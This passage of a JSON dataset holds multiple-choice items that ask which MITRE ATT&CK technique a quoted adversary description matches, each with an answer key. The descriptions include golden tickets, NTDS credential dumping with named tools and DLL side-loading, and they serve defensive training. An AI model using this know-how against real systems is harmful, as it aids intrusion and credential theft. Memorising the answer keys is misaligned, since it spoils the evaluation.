      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.\n\nAdversaries may manipulate a process PEB to evade defenses. For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.\n\nThis behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.",
      "options": "A. Event Triggered Execution: Screensaver, B. Hide Artifacts: Process Argument Spoofing, C. Data Manipulation: Stored Data Manipulation, D. Hijack Execution Flow: Path Interception by Unquoted Path",
      "choice": "B. Hide Artifacts: Process Argument Spoofing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.  Additionally, adversaries may leverage such control in conjunction with Digital Certificates to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications. Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.\nA. Compromise Infrastructure: DNS Server, B. Stage Capabilities: SEO Poisoning, C. Stage Capabilities: Upload Malware, D. Unsecured Credentials: Cloud Instance Metadata API\nAnswer:",
    "context": "",
    "output": "A. Compromise Infrastructure: DNS Server",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.  Additionally, adversaries may leverage such control in conjunction with Digital Certificates to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications. Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.",
      "options": "A. Compromise Infrastructure: DNS Server, B. Stage Capabilities: SEO Poisoning, C. Stage Capabilities: Upload Malware, D. Unsecured Credentials: Cloud Instance Metadata API",
      "choice": "A. Compromise Infrastructure: DNS Server",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory. \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.\nA. Steal or Forge Kerberos Tickets: Golden Ticket, B. Disk Wipe, C. Exfiltration Over C2 Channel, D. Steal or Forge Kerberos Tickets: Silver Ticket\nAnswer:",
    "context": "",
    "output": "A. Steal or Forge Kerberos Tickets: Golden Ticket",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory. \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.",
      "options": "A. Steal or Forge Kerberos Tickets: Golden Ticket, B. Disk Wipe, C. Exfiltration Over C2 Channel, D. Steal or Forge Kerberos Tickets: Silver Ticket",
      "choice": "A. Steal or Forge Kerberos Tickets: Golden Ticket",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. \n\nAdversaries may invoke processes using `nohup`, PowerShell `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups. This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.\n\nHiding from process interrupt signals may allow malware to continue execution, but unlike Trap this does not establish Persistence since the process will not be re-invoked once actually terminated.\n\nA. Hide Artifacts: Ignore Process Interrupts, B. Modify Authentication Process: Multi-Factor Authentication, C. Data from Configuration Repository, D. Weaken Encryption: Disable Crypto Hardware\nA:",
    "context": "",
    "output": "A. Hide Artifacts: Ignore Process Interrupts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. \n\nAdversaries may invoke processes using `nohup`, PowerShell `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups. This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.\n\nHiding from process interrupt signals may allow malware to continue execution, but unlike Trap this does not establish Persistence since the process will not be re-invoked once actually terminated.",
      "options": "A. Hide Artifacts: Ignore Process Interrupts, B. Modify Authentication Process: Multi-Factor Authentication, C. Data from Configuration Repository, D. Weaken Encryption: Disable Crypto Hardware",
      "choice": "A. Hide Artifacts: Ignore Process Interrupts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse The technique mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.\nA. Gather Victim Org Information, B. Unsecured Credentials: Cloud Instance Metadata API, C. Abuse Elevation Control Mechanism, D. Pre-OS Boot\nAnswer:",
    "context": "",
    "output": "D. Pre-OS Boot",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse The technique mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
      "options": "A. Gather Victim Org Information, B. Unsecured Credentials: Cloud Instance Metadata API, C. Abuse Elevation Control Mechanism, D. Pre-OS Boot",
      "choice": "D. Pre-OS Boot",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may buy, lease, rent, or obtain physical servers\u00a0that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in Drive-by Compromise, enabling Phishing operations, or facilitating Command and Control. Instead of compromising a third-party Server or renting a Virtual Private Server, adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused. \n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.\nA. Ingress Tool Transfer, B. Acquire Infrastructure: Server, C. Software Deployment Tools, D. Modify System Image: Downgrade System Image",
    "context": "",
    "output": "B. Acquire Infrastructure: Server",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may buy, lease, rent, or obtain physical servers\u00a0that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in Drive-by Compromise, enabling Phishing operations, or facilitating Command and Control. Instead of compromising a third-party Server or renting a Virtual Private Server, adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused. \n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.",
      "options": "A. Ingress Tool Transfer, B. Acquire Infrastructure: Server, C. Software Deployment Tools, D. Modify System Image: Downgrade System Image",
      "choice": "B. Acquire Infrastructure: Server",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\nOptions:\nA. System Binary Proxy Execution: Electron Applications, B. User Execution: Malicious Link, C. Remote Access Software, D. OS Credential Dumping: NTDS",
    "context": "",
    "output": "D. OS Credential Dumping: NTDS",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy",
      "options": "A. System Binary Proxy Execution: Electron Applications, B. User Execution: Malicious Link, C. Remote Access Software, D. OS Credential Dumping: NTDS",
      "choice": "D. OS Credential Dumping: NTDS",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.\n\nOptions:\nA. Office Application Startup: Add-ins, B. Data Obfuscation: Protocol Impersonation, C. Hardware Additions, D. XSL Script Processing",
    "context": "",
    "output": "B. Data Obfuscation: Protocol Impersonation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.",
      "options": "A. Office Application Startup: Add-ins, B. Data Obfuscation: Protocol Impersonation, C. Hardware Additions, D. XSL Script Processing",
      "choice": "B. Data Obfuscation: Protocol Impersonation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target. This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS and NTP, though the use of several others in the wild have been documented.  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.\n\nOptions:\nA. Hijack Execution Flow: DLL Search Order Hijacking, B. Network Denial of Service: Reflection Amplification, C. Boot or Logon Autostart Execution: Security Support Provider, D. Acquire Infrastructure: Serverless",
    "context": "",
    "output": "B. Network Denial of Service: Reflection Amplification",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target. This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS and NTP, though the use of several others in the wild have been documented.  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.",
      "options": "A. Hijack Execution Flow: DLL Search Order Hijacking, B. Network Denial of Service: Reflection Amplification, C. Boot or Logon Autostart Execution: Security Support Provider, D. Acquire Infrastructure: Serverless",
      "choice": "B. Network Denial of Service: Reflection Amplification",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.\n\nA. Hijack Execution Flow: DLL Side-Loading, B. Impair Defenses: Disable or Modify Linux Audit System, C. Modify Authentication Process, D. File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\nAnswer:",
    "context": "",
    "output": "A. Hijack Execution Flow: DLL Side-Loading",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
      "options": "A. Hijack Execution Flow: DLL Side-Loading, B. Impair Defenses: Disable or Modify Linux Audit System, C. Modify Authentication Process, D. File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
      "choice": "A. Hijack Execution Flow: DLL Side-Loading",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders\u2019 awareness of malicious activity. Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.\n\nRather than or in addition to Indicator Blocking, an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., Disable or Modify Tools). An adversary can also present a \u201chealthy\u201d system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.\n\nFor example, adversaries may show a fake Windows Security GUI and tray icon with a \u201chealthy\u201d system status after Windows Defender and other system tools have been disabled.\n\nA. Account Discovery: Local Account, B. Impair Defenses: Spoof Security Alerting, C. Native API, D. Obfuscated Files or Information: Fileless Storage\nAnswer:",
    "context": "",
    "output": "B. Impair Defenses: Spoof Security Alerting",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders\u2019 awareness of malicious activity. Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.\n\nRather than or in addition to Indicator Blocking, an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., Disable or Modify Tools). An adversary can also present a \u201chealthy\u201d system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.\n\nFor example, adversaries may show a fake Windows Security GUI and tray icon with a \u201chealthy\u201d system status after Windows Defender and other system tools have been disabled.",
      "options": "A. Account Discovery: Local Account, B. Impair Defenses: Spoof Security Alerting, C. Native API, D. Obfuscated Files or Information: Fileless Storage",
      "choice": "B. Impair Defenses: Spoof Security Alerting",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\n\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if added to the root of trust (i.e. Install Root Certificate).\n\nAfter creating a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.\n\nA. Develop Capabilities: Digital Certificates, B. Application Layer Protocol: File Transfer Protocols, C. Process Injection: Process Doppelg\u00e4nging, D. Abuse Elevation Control Mechanism: Setuid and Setgid\nA:",
    "context": "",
    "output": "A. Develop Capabilities: Digital Certificates",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\n\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if added to the root of trust (i.e. Install Root Certificate).\n\nAfter creating a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.",
      "options": "A. Develop Capabilities: Digital Certificates, B. Application Layer Protocol: File Transfer Protocols, C. Process Injection: Process Doppelg\u00e4nging, D. Abuse Elevation Control Mechanism: Setuid and Setgid",
      "choice": "A. Develop Capabilities: Digital Certificates",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.\n\nA. Event Triggered Execution: LC_LOAD_DYLIB Addition, B. Steal Application Access Token, C. Multi-Stage Channels, D. Execution Guardrails: Environmental Keying\nA:",
    "context": "",
    "output": "C. Multi-Stage Channels",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.",
      "options": "A. Event Triggered Execution: LC_LOAD_DYLIB Addition, B. Steal Application Access Token, C. Multi-Stage Channels, D. Execution Guardrails: Environmental Keying",
      "choice": "C. Multi-Stage Channels",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.\n\nPossible answers:\nA. Input Capture, B. Modify Authentication Process: Network Provider DLL, C. Modify Registry, D. Remote Services: SMB/Windows Admin Shares",
    "context": "",
    "output": "C. Modify Registry",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
      "options": "A. Input Capture, B. Modify Authentication Process: Network Provider DLL, C. Modify Registry, D. Remote Services: SMB/Windows Admin Shares",
      "choice": "C. Modify Registry",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.\n\nSimilar to fileless in-memory behaviors such as Reflective Code Loading and Process Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of Persistence) and collected data not yet exfiltrated from the victim (e.g., Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.\nA. Hijack Execution Flow: COR_PROFILER, B. Data Transfer Size Limits, C. Obfuscated Files or Information: Fileless Storage, D. Indicator Removal",
    "context": "",
    "output": "C. Obfuscated Files or Information: Fileless Storage",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.\n\nSimilar to fileless in-memory behaviors such as Reflective Code Loading and Process Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of Persistence) and collected data not yet exfiltrated from the victim (e.g., Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.",
      "options": "A. Hijack Execution Flow: COR_PROFILER, B. Data Transfer Size Limits, C. Obfuscated Files or Information: Fileless Storage, D. Indicator Removal",
      "choice": "C. Obfuscated Files or Information: Fileless Storage",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.\n\nOptions:\nA. Hide Infrastructure, B. Hijack Execution Flow: DLL Side-Loading, C. System Services, D. Application Layer Protocol: File Transfer Protocols",
    "context": "",
    "output": "D. Application Layer Protocol: File Transfer Protocols",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "options": "A. Hide Infrastructure, B. Hijack Execution Flow: DLL Side-Loading, C. System Services, D. Application Layer Protocol: File Transfer Protocols",
      "choice": "D. Application Layer Protocol: File Transfer Protocols",
      "category": [
